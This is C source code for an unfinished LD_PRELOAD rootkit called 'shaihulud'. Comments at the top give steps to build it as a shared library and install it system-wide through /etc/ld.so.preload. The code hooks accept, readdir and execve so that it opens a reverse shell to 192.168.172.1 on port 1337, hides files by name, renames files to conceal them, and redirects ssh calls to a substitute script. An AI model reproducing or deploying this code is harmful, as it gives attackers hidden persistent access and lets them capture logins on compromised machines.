//gcc shaihulud.c -fPIC -shared -D_GNU_SOURCE -o libc.shaihulud.so -ldl
//move compiled .so to /usr/lib/
//echo "/usr/lib/[compiled.so]" > /etc/ld.so.preload
//export LD_PRELOAD=/path/to/rootkit.so
//TODO: individually submerge, create worm files
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MESSAGE "Shai'hulud called...\n"
#define HIDEWORD "shaihulud"
#define GID 4444
#define SRCPORT 42069
#define REMOTE_ADDR "192.168.172.1"
#define REMOTE_PORT 1337


void *rev_shell(void){
  int port = 1337;
  struct sockaddr_in revsockaddr;

  int sockt = socket(AF_INET, SOCK_STREAM, 0);
  revsockaddr.sin_family = AF_INET;
  revsockaddr.sin_port = htons(port);
  revsockaddr.sin_addr.s_addr = inet_addr("192.168.172.1");

  connect(sockt, (struct sockaddr *) &revsockaddr,
  sizeof(revsockaddr));
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);


  char * const argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);

}

void submerge(char const *toHide){
  struct dirent *entry = NULL;
  DIR *dp;
  char old[255];
  char new[255];
  char prefix[] = HIDEWORD;
  dp = opendir(toHide);
  if(dp != NULL){
    while((entry = readdir(dp))){
      sprintf(old, "%s/%s", toHide, entry->d_name);
      sprintf(new, "%s/%s%s", toHide, prefix, entry->d_name);
      printf("New filename: %s\n", new);
      rename(old, new);
    }
  }
  closedir(dp);
}

//GET THIS WORKING
int (*real_accept)(int, struct sockaddr *, socklen_t *);
int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen){
	real_accept = dlsym(RTLD_NEXT, "accept");
    struct sockaddr_in * tmp = (struct sockaddr_in *)addr;
    if(tmp && ntohs(tmp->sin_port) == SRCPORT) {
        rev_shell();
    }
    return real_accept(sockfd, addr, addrlen);
}



struct dirent *(*real_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    pid_t child_pid = fork();
    if(child_pid == 0){
        rev_shell();
        _exit(0);
    }
    struct dirent *dir;

    while (dir = real_readdir(dirp)){
        if(strstr(dir->d_name, HIDEWORD) == 0){
          break;
        }
    }

    return dir;
}

int (*real_execve) (const char *, char *const argv[], char *const envp[]);
int execve(const char* pathname, char* const argv[], char* const envp[]) {

    real_execve = dlsym(RTLD_NEXT, "execve");
    if((strcmp(argv[0], "ssh") == 0)){
      execv("/home/shaihulud.sh", argv);
      return -1;
    }

    return real_execve(pathname, argv, envp);
}
